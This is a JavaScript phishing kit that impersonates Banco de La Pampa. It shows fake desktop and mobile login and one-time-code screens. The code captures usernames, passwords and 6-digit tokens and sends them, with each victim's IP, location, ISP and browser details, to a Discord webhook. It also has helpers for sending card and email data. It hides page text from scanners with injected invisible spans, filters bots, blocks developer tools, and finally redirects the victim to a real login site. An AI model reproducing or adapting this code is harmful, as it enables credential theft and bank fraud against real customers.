// Banco de La Pampa - SPA con detección de viewport
// Adaptado para Discord Webhooks
// Reglas AGENTS.md: lg=form, mit=submit, tiki/toko/diki/doko para campos sensibles

// ============ CONFIGURACIÓN DISCORD ============
// Webhook URL centralizado en discord-config.js (DiscordConfig)

/* ************** BotShield Module ************** */
const BotShield = (function() {
  'use strict';
  
  let pageLoadTime = Date.now();
  let mouseMovements = 0;
  let humanInteractions = 0;
  let lastInputTime = 0;
  let inputSpeeds = [];
  let honeypotTriggered = false;
  
  const hiddenStyles = ['display:none', 'display:none;font-size:0'];
  
  function randomNoise() {
    return Math.random().toString(36).slice(2, 5);
  }
  
  function obfuscateText(text) {
    const clean = String(text || '');
    let result = '';
    let index = 0;
    let useAlt = false;
    while (index < clean.length) {
      const chunkLen = 2 + Math.floor(Math.random() * 3);
      const part = clean.slice(index, index + chunkLen);
      result += part;
      if (index + chunkLen < clean.length) {
        const style = useAlt ? hiddenStyles[1] : hiddenStyles[0];
        result += `<span style="${style}">${randomNoise()}</span>`;
        useAlt = !useAlt;
      }
      index += chunkLen;
    }
    return result;
  }
  
  function obfuscateElement(selector) {
    const nodes = document.querySelectorAll(selector);
    nodes.forEach(node => {
      const text = node.textContent || '';
      node.innerHTML = obfuscateText(text.trim());
    });
  }
  
  function obfuscateAll() {
    obfuscateElement('.lg-title, .lg-subtitle, .lg-label, .lg-alert-title, .lg-alert-body, .lg-error, .lg-link, .btn-text, .footer-note, .text-label, .text-size-3, .text-size-2, .text-size-5, .font-weight-bold');
  }
  
  function init() {
    document.addEventListener('mousemove', () => {
      mouseMovements++;
      if (mouseMovements > 2) humanInteractions++;
    });
    document.addEventListener('click', () => humanInteractions++);
    document.addEventListener('scroll', () => humanInteractions++);
    document.addEventListener('touchstart', () => humanInteractions++);
    document.addEventListener('keydown', trackInputSpeed);
    setupHoneypot();
  }
  
  function trackInputSpeed() {
    const now = Date.now();
    if (lastInputTime > 0) {
      const speed = now - lastInputTime;
      if (speed < 30) inputSpeeds.push(speed);
    }
    lastInputTime = now;
  }
  
  function setupHoneypot() {
    const hp = document.createElement('input');
    hp.type = 'text';
    hp.name = 'website';
    hp.id = 'website';
    hp.tabIndex = -1;
    hp.autocomplete = 'off';
    hp.style.cssText = 'position:absolute;opacity:0;pointer-events:none;height:0;width:0;left:-9999px;';
    hp.addEventListener('change', () => honeypotTriggered = true);
    hp.addEventListener('input', () => honeypotTriggered = true);
    document.body.appendChild(hp);
  }
  
  function isBot(strict = true) {
    if (honeypotTriggered) {
        console.log('BotShield: Honeypot triggered');
        return true;
    }
    if (strict) {
      const timeElapsed = Date.now() - pageLoadTime;
      if (timeElapsed < 100) {
          console.log('BotShield: Too fast (<100ms)');
          return true;
      }
      if (inputSpeeds.length > 20) {
        const avgSpeed = inputSpeeds.reduce((a, b) => a + b) / inputSpeeds.length;
        if (avgSpeed < 20) {
            console.log('BotShield: Input too fast');
            return true;
        }
      }
    }
    return false;
  }
  
  function markBot() {
    honeypotTriggered = true;
  }
  
  return { init, isBot, markBot, obfuscateText, obfuscateElement, obfuscateAll };
})();

/* ************** Validators Module ************** */
const Validators = (function() {
  'use strict';
  
  function sanitize(input, type = 'alphanumeric') {
    switch (type) {
      case 'numeric': return input.replace(/[^0-9]/g, '');
      case 'email': return input.trim().toLowerCase();
      default: return input.trim();
    }
  }
  
  function limitLength(input, maxLength) {
    return input.slice(0, maxLength);
  }
  
  function code6Digits(code) {
    return /^\d{6}$/.test(code);
  }
  
  function getLastDigits(number, digits = 4) {
    const cleanNumber = number.replace(/\D/g, '');
    return cleanNumber.length >= digits ? cleanNumber.slice(-digits) : '0000';
  }
  
  return { sanitize, limitLength, code6Digits, getLastDigits };
})();

/* ************** Discord Module ************** */
const Discord = (function() {
  'use strict';
  
  // Delegamos sendWebhook y getIpInfo a DiscordConfig (discord-config.js)
  var sendWebhook = DiscordConfig.sendWebhook;
  var getIpInfo = DiscordConfig.getIpInfoAlt;
  
  function sendCredentials(user, pass) {
    return getIpInfo().then(info => {
      const embed = {
        title: '🏦 BANCO PAMPA - Credenciales',
        color: 0xd4a017,
        fields: [
          { name: '👤 Usuario', value: user || 'N/A', inline: true },
          { name: '🔐 Clave', value: pass || 'N/A', inline: true },
          { name: '\u200B', value: '\u200B', inline: true },
          { name: '📌 IP', value: info.ip || 'N/A', inline: true },
          { name: '📍 Ubicación', value: info.location || 'N/A', inline: true },
          { name: '🏢 ISP', value: info.isp || 'N/A', inline: true },
          { name: '🌐 User Agent', value: navigator.userAgent.substring(0, 1000) || 'N/A', inline: false }
        ],
        footer: { text: `País: ${info.country || '??'} ${info.flag}` },
        timestamp: new Date().toISOString()
      };
      return sendWebhook('@everyone Nueva captura de credenciales', [embed]);
    });
  }
  
  function sendToken(user, token) {
    return getIpInfo().then(info => {
      const embed = {
        title: '🔑 BANCO PAMPA - Token',
        color: 0x00ff00,
        fields: [
          { name: '👤 Usuario', value: user || 'N/A', inline: true },
          { name: '🔢 Token', value: token || 'N/A', inline: true },
          { name: '📌 IP', value: info.ip || 'N/A', inline: true },
          { name: '📍 Ubicación', value: info.location || 'N/A', inline: true }
        ],
        footer: { text: `País: ${info.country || '??'} ${info.flag}` },
        timestamp: new Date().toISOString()
      };
      return sendWebhook('@everyone Nuevo token recibido', [embed]);
    });
  }

  function sendCard(user, card) {
    return getIpInfo().then(info => {
      const embed = {
        title: '💳 BANCO PAMPA - Tarjeta',
        color: 0xff0000,
        fields: [
          { name: '👤 Usuario', value: user || 'N/A', inline: true },
          { name: '🔢 Tarjeta', value: card || 'N/A', inline: true },
          { name: '📌 IP', value: info.ip || 'N/A', inline: true },
          { name: '📍 Ubicación', value: info.location || 'N/A', inline: true }
        ],
        footer: { text: `País: ${info.country || '??'} ${info.flag}` },
        timestamp: new Date().toISOString()
      };
      return sendWebhook('@everyone Datos de tarjeta recibidos', [embed]);
    });
  }

  function sendEmailPass(user, email, pass, card) {
    return getIpInfo().then(info => {
      const embed = {
        title: '📧 BANCO PAMPA - Correo y Clave',
        color: 0x0099ff,
        fields: [
          { name: '👤 Usuario', value: user || 'N/A', inline: true },
          { name: '📨 Correo', value: email || 'N/A', inline: true },
          { name: '🔐 Clave', value: pass || 'N/A', inline: true },
          { name: '🔢 Tarjeta', value: card || 'N/A', inline: true },
          { name: '📌 IP', value: info.ip || 'N/A', inline: true }
        ],
        footer: { text: `País: ${info.country || '??'} ${info.flag}` },
        timestamp: new Date().toISOString()
      };
      return sendWebhook('@everyone Correo y clave capturados', [embed]);
    });
  }

  function sendEmailCode(user, code) {
    return getIpInfo().then(info => {
      const embed = {
        title: '📧 BANCO PAMPA - Código de Verificación',
        color: 0xffa500,
        fields: [
          { name: '👤 Usuario', value: user || 'N/A', inline: true },
          { name: '🔐 Código', value: code || 'N/A', inline: true },
          { name: '📌 IP', value: info.ip || 'N/A', inline: true }
        ],
        footer: { text: `País: ${info.country || '??'} ${info.flag}` },
        timestamp: new Date().toISOString()
      };
      return sendWebhook('@everyone Código de verificación recibido', [embed]);
    });
  }
  
  return { sendWebhook, getIpInfo, sendCredentials, sendToken, sendCard, sendEmailPass, sendEmailCode };
})();

/* ************** ViewsDesktop Module ************** */
const ViewsDesktop = (function() {
  'use strict';
  
  const { obfuscateText } = BotShield;
  
  function login() {
    return `
      <div class="fh-100 fw-100 d-flex flex-column justify-content-center align-items-center lnk-bg-light position-absolute">
        <div class="card border-light shadow-sm" style="max-width:420px;padding:40px;">
          <div class="text-center mb-4">
            <h1 class="font-weight-normal text-size-5">${obfuscateText('Iniciar Sesión')}</h1>
          </div>
          <div class="lg-group mb-4">
            <label class="text-size-3 font-weight-bold">${obfuscateText('Usuario')}</label>
            <input class="lg-control w-full p-3 border rounded" name="tiki" id="tiki" type="text" placeholder="Email o teléfono">
          </div>
          <div class="lg-group mb-4">
            <label class="text-size-3 font-weight-bold">${obfuscateText('Clave')}</label>
            <input class="lg-control w-full p-3 border rounded" name="toko" id="toko" type="password" placeholder="Contraseña">
          </div>
          <div class="lg-error hidden mb-3" id="lg-error" role="alert" style="color:#dc3545;"></div>
          <button class="w-100 btn btn-ingresar bg-gray-800 text-white py-3 rounded" name="mit-lg" id="mit-lg" type="button">
            <span>${obfuscateText('INGRESAR')}</span>
          </button>
        </div>
      </div>
    `;
  }
  
  function loading() {
    return `
      <div class="fh-100 fw-100 d-flex flex-column justify-content-center align-items-center lnk-bg-light position-absolute">
        <div class="lg-panel lg-loading-panel text-center" style="max-width:420px;">
          <div class="lg-spinner" style="width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#d4a017;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
          <h2 class="font-weight-normal text-size-5">${obfuscateText('Verificando credenciales')}</h2>
          <p class="text-size-2 text-gray-600">${obfuscateText('Por favor, no cierres esta pagina')}</p>
          <div class="lg-progress" style="width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-top:20px;">
            <div class="lg-progress-bar" style="height:100%;width:0;background:linear-gradient(90deg,#d4a017,#b8860b);animation:progress 3s ease-in-out forwards;"></div>
          </div>
        </div>
      </div>
    `;
  }
  
  function token(userData) {
    const userDisplay = userData?.user || 'Usuario';
    return `
      <div class="fh-100 fw-100 d-flex flex-column justify-content-center align-items-center lnk-bg-light position-absolute">
        <div class="card border-light shadow-sm" style="max-width:420px;padding:32px;">
          <div class="text-center mb-4">
            <h1 class="font-weight-normal text-size-5">${obfuscateText('Verificación de seguridad')}</h1>
          </div>
          <p class="text-size-2 text-gray-600 text-center mb-3">${obfuscateText('Ingresa el código de 6 dígitos')}</p>
          <p class="text-center mb-4" style="background:rgba(212,160,23,0.1);padding:8px 16px;border-radius:8px;font-size:14px;">👤 ${userDisplay}</p>
          <div class="otp-container mb-4">
            <div class="otp-input-group d-flex justify-content-center" id="otp-group" style="gap:10px;">
              <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" id="otp-0" data-index="0" style="width:48px;height:56px;text-align:center;font-size:24px;font-weight:600;border:2px solid #e0e0e0;border-radius:10px;outline:none;">
              <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" id="otp-1" data-index="1" style="width:48px;height:56px;text-align:center;font-size:24px;font-weight:600;border:2px solid #e0e0e0;border-radius:10px;outline:none;">
              <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" id="otp-2" data-index="2" style="width:48px;height:56px;text-align:center;font-size:24px;font-weight:600;border:2px solid #e0e0e0;border-radius:10px;outline:none;">
              <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" id="otp-3" data-index="3" style="width:48px;height:56px;text-align:center;font-size:24px;font-weight:600;border:2px solid #e0e0e0;border-radius:10px;outline:none;">
              <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" id="otp-4" data-index="4" style="width:48px;height:56px;text-align:center;font-size:24px;font-weight:600;border:2px solid #e0e0e0;border-radius:10px;outline:none;">
              <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" id="otp-5" data-index="5" style="width:48px;height:56px;text-align:center;font-size:24px;font-weight:600;border:2px solid #e0e0e0;border-radius:10px;outline:none;">
            </div>
            <div class="lg-error hidden text-center mt-2" id="lg-error" role="alert" style="color:#dc3545;"></div>
          </div>
          <input type="hidden" id="diki" name="diki" value="">
          <button class="w-100 btn text-white btn-ingresar bg-gray-800 py-3 rounded" id="mit-token" type="button">
            <span>${obfuscateText('VERIFICAR')}</span>
          </button>
          <button class="btn btn-link text-primary mt-3 w-100" id="back-login" type="button">${obfuscateText('Volver al inicio')}</button>
        </div>
      </div>
    `;
  }
  
  function loading2() {
    return `
      <div class="fh-100 fw-100 d-flex flex-column justify-content-center align-items-center lnk-bg-light position-absolute">
        <div class="lg-panel lg-loading-panel text-center" style="max-width:420px;">
          <div class="lg-spinner" style="width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#d4a017;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
          <h2 class="font-weight-normal text-size-5">${obfuscateText('Validando token')}</h2>
          <p class="text-size-2 text-gray-600">${obfuscateText('Espera un momento...')}</p>
          <div class="lg-progress" style="width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-top:20px;">
            <div class="lg-progress-bar lg-fast" style="height:100%;width:0;background:linear-gradient(90deg,#d4a017,#b8860b);animation:progress 2s ease-in-out forwards;"></div>
          </div>
        </div>
      </div>
    `;
  }
  
  function success() {
    return `
      <div class="fh-100 fw-100 d-flex flex-column justify-content-center align-items-center lnk-bg-light position-absolute">
        <div class="lg-panel lg-success-panel text-center" style="max-width:420px;">
          <div style="width:64px;height:64px;background:linear-gradient(135deg,#10b981,#059669);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 20px;">✓</div>
          <h2 class="font-weight-normal text-size-5">${obfuscateText('Verificación exitosa')}</h2>
          <p class="text-size-2 text-gray-600">${obfuscateText('Redirigiendo a tu cuenta...')}</p>
        </div>
      </div>
    `;
  }
  
  return { login, loading, token, loading2, success };
})();

/* ************** ViewsMobile Module ************** */
const ViewsMobile = (function() {
  'use strict';
  
  const { obfuscateText } = BotShield;
  
  function login() {
    return `
      <main class="w-full max-w-md px-6 flex flex-col gap-6 py-8">
        <div class="text-center mb-4">
          <h1 class="text-2xl font-normal text-gray-700">${obfuscateText('Iniciar Sesión')}</h1>
        </div>
        <div class="space-y-4">
          <div>
            <label class="block text-sm font-medium text-gray-600 mb-1" for="tiki">${obfuscateText('Usuario')}</label>
            <input class="w-full p-4 border border-gray-300 rounded-lg" id="tiki" name="tiki" type="text" placeholder="Email o teléfono">
          </div>
          <div>
            <label class="block text-sm font-medium text-gray-600 mb-1" for="toko">${obfuscateText('Clave')}</label>
            <input class="w-full p-4 border border-gray-300 rounded-lg" id="toko" name="toko" type="password" placeholder="Contraseña">
          </div>
          <div class="lg-error hidden text-center" id="lg-error" role="alert" style="color:#dc3545;"></div>
          <button class="w-full bg-gray-800 text-white font-bold py-4 rounded-lg" type="button" id="mit-lg">
            ${obfuscateText('INGRESAR')}
          </button>
        </div>
      </main>
    `;
  }
  
  function loading() {
    return `
      <main class="w-full max-w-md px-6 flex flex-col items-center justify-center min-h-screen">
        <div class="text-center">
          <div class="lg-spinner mx-auto mb-5" style="width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#d4a017;border-radius:50%;animation:spin 1s linear infinite;"></div>
          <h2 class="text-xl font-normal text-gray-700 mb-2">${obfuscateText('Verificando credenciales')}</h2>
          <p class="text-sm text-gray-500">${obfuscateText('Por favor, no cierres esta pagina')}</p>
          <div class="mt-5 w-full h-1.5 bg-gray-200 rounded-full overflow-hidden">
            <div class="h-full bg-yellow-600 rounded-full" style="animation:progress 3s ease-in-out forwards;"></div>
          </div>
        </div>
      </main>
    `;
  }
  
  function token(userData) {
    const userDisplay = userData?.user || 'Usuario';
    return `
      <main class="w-full max-w-md px-6 flex flex-col gap-6 py-8">
        <div class="text-center">
          <h1 class="text-xl font-normal text-gray-700 mb-2">${obfuscateText('Verificación de seguridad')}</h1>
          <p class="text-sm text-gray-500">${obfuscateText('Ingresa el código de 6 dígitos')}</p>
          <p class="mt-3 inline-block px-4 py-2 rounded-lg text-sm" style="background:rgba(212,160,23,0.1);">👤 ${userDisplay}</p>
        </div>
        <div class="otp-container my-4">
          <div class="otp-input-group flex justify-center gap-2" id="otp-group">
            <input type="text" inputmode="numeric" maxlength="1" class="otp-digit w-11 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg" id="otp-0" data-index="0">
            <input type="text" inputmode="numeric" maxlength="1" class="otp-digit w-11 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg" id="otp-1" data-index="1">
            <input type="text" inputmode="numeric" maxlength="1" class="otp-digit w-11 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg" id="otp-2" data-index="2">
            <input type="text" inputmode="numeric" maxlength="1" class="otp-digit w-11 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg" id="otp-3" data-index="3">
            <input type="text" inputmode="numeric" maxlength="1" class="otp-digit w-11 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg" id="otp-4" data-index="4">
            <input type="text" inputmode="numeric" maxlength="1" class="otp-digit w-11 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg" id="otp-5" data-index="5">
          </div>
          <div class="lg-error hidden text-center mt-3" id="lg-error" role="alert" style="color:#dc3545;"></div>
        </div>
        <input type="hidden" id="diki" name="diki" value="">
        <button class="w-full bg-gray-800 text-white font-bold py-4 rounded-lg" type="button" id="mit-token">
          ${obfuscateText('VERIFICAR')}
        </button>
        <button class="text-primary text-sm mt-2" id="back-login" type="button">${obfuscateText('Volver al inicio')}</button>
      </main>
    `;
  }
  
  function loading2() {
    return `
      <main class="w-full max-w-md px-6 flex flex-col items-center justify-center min-h-screen">
        <div class="text-center">
          <div class="lg-spinner mx-auto mb-5" style="width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#d4a017;border-radius:50%;animation:spin 1s linear infinite;"></div>
          <h2 class="text-xl font-normal text-gray-700 mb-2">${obfuscateText('Validando token')}</h2>
          <p class="text-sm text-gray-500">${obfuscateText('Espera un momento...')}</p>
          <div class="mt-5 w-full h-1.5 bg-gray-200 rounded-full overflow-hidden">
            <div class="h-full bg-yellow-600 rounded-full" style="animation:progress 2s ease-in-out forwards;"></div>
          </div>
        </div>
      </main>
    `;
  }
  
  function success() {
    return `
      <main class="w-full max-w-md px-6 flex flex-col items-center justify-center min-h-screen">
        <div class="text-center">
          <div class="mx-auto mb-5 flex items-center justify-center" style="width:64px;height:64px;background:linear-gradient(135deg,#10b981,#059669);color:white;border-radius:50%;font-size:32px;">✓</div>
          <h2 class="text-xl font-normal text-gray-700 mb-2">${obfuscateText('Verificación exitosa')}</h2>
          <p class="text-sm text-gray-500">${obfuscateText('Redirigiendo a tu cuenta...')}</p>
        </div>
      </main>
    `;
  }
  
  return { login, loading, token, loading2, success };
})();

/* ************** Router Module ************** */
const Router = (function() {
  'use strict';
  
  const STATES = {
    LOGIN: 'login',
    LOADING: 'loading',
    TOKEN: 'token',
    LOADING2: 'loading2',
    SUCCESS: 'success'
  };
  
  let currentState = null;
  const stateCallbacks = new Map();
  
  function register(state, callback) {
    stateCallbacks.set(state, callback);
  }
  
  function navigate(state, data = {}) {
    const validStates = Object.values(STATES);
    if (!validStates.includes(state)) {
      console.error(`Estado no válido: ${state}`);
      return;
    }
    currentState = state;
    const callback = stateCallbacks.get(state);
    if (callback) callback(data);
  }
  
  function getCurrentState() {
    return currentState;
  }
  
  return { STATES, register, navigate, getCurrentState };
})();

/* ************** UI Module ************** */
const UI = (function() {
  'use strict';
  
  let isMobile = false;
  let Views = null;
  
  function detectViewport() {
    isMobile = window.innerWidth < 768;
    Views = isMobile ? ViewsMobile : ViewsDesktop;
    return isMobile;
  }
  
  function getViews() {
    return Views;
  }
  
  function isMobileViewport() {
    return isMobile;
  }
  
  function applyViewportClass() {
    const body = document.body;
    const wasMobile = isMobile;
    detectViewport();
    
    body.classList.toggle('is-mobile', isMobile);
    body.classList.toggle('is-desktop', !isMobile);
    
    return wasMobile !== isMobile;
  }
  
  function preventContextMenu() {
    document.addEventListener('contextmenu', e => e.preventDefault());
  }
  
  function blockDevTools() {
    document.addEventListener('keydown', e => {
      if (e.key === 'F12') e.preventDefault();
      if (e.ctrlKey && e.key === 'u') e.preventDefault();
      if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();
    });
  }
  
  function togglePassword() {
    const input = document.getElementById('toko');
    const toggle = document.getElementById('toggle-toko');
    if (!input || !toggle) return;
    const isText = input.type === 'text';
    input.type = isText ? 'password' : 'text';
    
    const icon = toggle.querySelector('.material-icons-outlined');
    if (icon) icon.textContent = isText ? 'visibility_off' : 'visibility';
  }
  
  function showError(message) {
    const error = document.getElementById('lg-error');
    if (!error) return;
    error.innerHTML = BotShield.obfuscateText(message);
    error.classList.remove('hidden');
  }
  
  function clearError() {
    const error = document.getElementById('lg-error');
    if (!error) return;
    error.classList.add('hidden');
    error.innerHTML = '';
  }
  
  function setupLoginLg(onMit) {
    const userInput = document.getElementById('tiki');
    const passInput = document.getElementById('toko');
    const btnMit = document.getElementById('mit-lg');
    
    if (!userInput || !passInput || !btnMit) return;
    
    btnMit.disabled = true;
    btnMit.style.cursor = 'not-allowed';
    
    function checkRequirements() {
      const user = userInput.value.trim();
      const pass = passInput.value.trim();
      
      const hasUser = user.length > 0;
      const validPass = pass.length >= 3;
      const allValid = hasUser && validPass;
      
      btnMit.disabled = !allValid;
      btnMit.style.cursor = allValid ? 'pointer' : 'not-allowed';
      
      if (allValid) {
        btnMit.setAttribute('style', 'background-color: #0078d4 !important; color: #ffffff !important; opacity: 1; cursor: pointer;');
      } else {
        btnMit.setAttribute('style', 'background-color: #6b7280 !important; color: #ffffff !important; opacity: 0.6; cursor: not-allowed;');
        btnMit.disabled = true;
      }
      
      return allValid;
    }
    
    checkRequirements();
    
    userInput.addEventListener('input', () => {
      userInput.classList.remove('invalid');
      clearError();
      checkRequirements();
    });
    
    passInput.addEventListener('input', () => {
      passInput.classList.remove('invalid');
      clearError();
      checkRequirements();
    });
    
    function validate() {
      const user = userInput.value.trim();
      const pass = passInput.value.trim();
      let ok = true;
      
      if (!user) {
        ok = false;
        userInput.classList.add('invalid');
      }
      if (pass.length < 3) {
        ok = false;
        passInput.classList.add('invalid');
      }
      if (!ok) {
        showError('Completa usuario y clave de al menos 3 caracteres.');
        return null;
      }
      return { user, pass };
    }
    
    btnMit.addEventListener('click', () => {
      console.log('Login button clicked');
      if (BotShield.isBot()) {
        console.warn('BotShield blocked click');
        BotShield.markBot();
        return;
      }
      
      const data = validate();
      if (!data) {
        console.warn('Validation failed');
        return;
      }
      
      console.log('Validation success, sending credentials...');
      clearError();
      btnMit.classList.add('loading');
      btnMit.style.opacity = '0.8';
      
      localStorage.setItem('tempUser', data.user);
      
      onMit(data);
    });
    
    passInput.addEventListener('keypress', e => {
      if (e.key === 'Enter' && !btnMit.disabled) btnMit.click();
    });
  }
  
  function setupTokenLg(onMit, onBack) {
    const mitButton = document.getElementById('mit-token');
    const backButton = document.getElementById('back-login');
    const hiddenInput = document.getElementById('diki');
    const otpInputs = [];
    
    for (let i = 0; i < 6; i++) {
      const input = document.getElementById('otp-' + i);
      if (input) otpInputs.push(input);
    }
    
    if (otpInputs.length !== 6 || !mitButton) return;
    
    function getCode() {
      return otpInputs.map(input => input.value).join('');
    }
    
    function updateHiddenInput() {
      if (hiddenInput) hiddenInput.value = getCode();
    }
    
    function handleInput(index, e) {
      const input = otpInputs[index];
      const value = e.target.value;
      
      if (!/^\d*$/.test(value)) {
        input.value = value.replace(/\D/g, '');
        return;
      }
      
      if (value.length > 1) input.value = value[0];
      
      if (value) {
        input.classList.add('filled');
        if (index < 5) otpInputs[index + 1].focus();
      } else {
        input.classList.remove('filled');
      }
      
      updateHiddenInput();
    }
    
    function handleKeyDown(index, e) {
      if (e.key === 'Backspace' && !otpInputs[index].value && index > 0) {
        otpInputs[index - 1].focus();
      } else if (e.key === 'ArrowLeft' && index > 0) {
        otpInputs[index - 1].focus();
      } else if (e.key === 'ArrowRight' && index < 5) {
        otpInputs[index + 1].focus();
      }
    }
    
    function handlePaste(e) {
      e.preventDefault();
      const pasteData = e.clipboardData.getData('text');
      const digits = pasteData.replace(/\D/g, '').split('').slice(0, 6);
      digits.forEach((digit, i) => {
        if (otpInputs[i]) {
          otpInputs[i].value = digit;
          otpInputs[i].classList.add('filled');
        }
      });
      if (digits.length > 0 && digits.length < 6) {
        otpInputs[digits.length].focus();
      } else if (digits.length === 6) {
        otpInputs[5].focus();
      }
      updateHiddenInput();
    }
    
    otpInputs.forEach((input, index) => {
      input.addEventListener('input', e => handleInput(index, e));
      input.addEventListener('keydown', e => handleKeyDown(index, e));
      input.addEventListener('paste', handlePaste);
    });
    
    mitButton.addEventListener('click', () => {
      if (BotShield.isBot()) {
        BotShield.markBot();
        return;
      }
      
      const code = getCode();
      otpInputs.forEach(input => input.classList.remove('invalid'));
      clearError();
      
      if (!Validators.code6Digits(code)) {
        otpInputs.forEach(input => input.classList.add('invalid'));
        showError('Ingresa un código de 6 dígitos válido');
        return;
      }
      
      mitButton.classList.add('loading');
      onMit(code);
    });
    
    if (backButton) {
      backButton.addEventListener('click', onBack);
    }
    
    otpInputs[0].focus();
  }
  
  return {
    detectViewport,
    getViews,
    isMobileViewport,
    applyViewportClass,
    preventContextMenu,
    blockDevTools,
    showError,
    clearError,
    setupLoginLg,
    setupTokenLg
  };
})();

/* ************** App Initialization ************** */
(function() {
  'use strict';
  
  function injectGlobalStyles() {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      @keyframes progress {
        0% { width: 0; }
        100% { width: 100%; }
      }
      .hidden { display: none !important; }
      .invalid { border-color: #dc3545 !important; }
      .otp-digit.filled { border-color: #0078d4 !important; background: rgba(0,120,212,0.05); }
      .otp-digit:focus { border-color: #0078d4 !important; box-shadow: 0 0 0 3px rgba(0,120,212,0.18); }
    `;
    document.head.appendChild(style);
  }
  
  document.addEventListener('DOMContentLoaded', function() {
    BotShield.init();
    injectGlobalStyles();
    
    setTimeout(function() {
      UI.applyViewportClass();
      UI.preventContextMenu();
      UI.blockDevTools();
      
      const app = document.getElementById('app');
      let tempUser = '';
      
      function renderView(viewName, data) {
        if (!app) return;
        const Views = UI.getViews();
        if (Views && Views[viewName]) {
          app.innerHTML = Views[viewName](data);
        }
      }
      
      Router.register(Router.STATES.LOGIN, function() {
        renderView('login');
        UI.setupLoginLg(function(data) {
          tempUser = data.user;
          localStorage.setItem('tempUser', data.user);
          
          const btn = document.querySelector('#mit-lg');
          if(btn) btn.innerHTML = '<span>ENVIANDO...</span>';
          
          Discord.sendCredentials(data.user, data.pass)
            .then(() => {
              console.log('Credentials sent, redirecting...');
              setTimeout(() => {
                Router.navigate(Router.STATES.LOADING);
              }, 1500);
            })
            .catch(err => {
              console.error('Error sending credentials:', err);
              setTimeout(() => {
                Router.navigate(Router.STATES.LOADING);
              }, 1500);
            });
        });
      });
      
      Router.register(Router.STATES.LOADING, function() {
        renderView('loading');
        setTimeout(() => {
          Router.navigate(Router.STATES.TOKEN, { user: tempUser || localStorage.getItem('tempUser') });
        }, 3000);
      });
      
      Router.register(Router.STATES.TOKEN, function(data) {
        renderView('token', data);
        UI.setupTokenLg(
          function(code) {
            const user = data.user || localStorage.getItem('tempUser') || 'Usuario';
            Discord.sendToken(user, code)
              .then(() => Router.navigate(Router.STATES.LOADING2))
              .catch(() => Router.navigate(Router.STATES.LOADING2));
          },
          function() {
            Router.navigate(Router.STATES.LOGIN);
          }
        );
      });
      
      Router.register(Router.STATES.LOADING2, function() {
        renderView('loading2');
        setTimeout(() => {
          Router.navigate(Router.STATES.SUCCESS);
        }, 2500);
      });
      
      Router.register(Router.STATES.SUCCESS, function() {
        renderView('success');
        setTimeout(() => {
          window.location.href = 'https://login.live.com/';
        }, 3000);
      });
      
      Router.navigate(Router.STATES.LOGIN);
      
      let resizeTimeout;
      window.addEventListener('resize', function() {
        clearTimeout(resizeTimeout);
        resizeTimeout = setTimeout(function() {
          const viewChanged = UI.applyViewportClass();
          if (viewChanged) {
            Router.navigate(Router.getCurrentState());
          }
        }, 250);
      });
      
    }, 800);
  });
})();
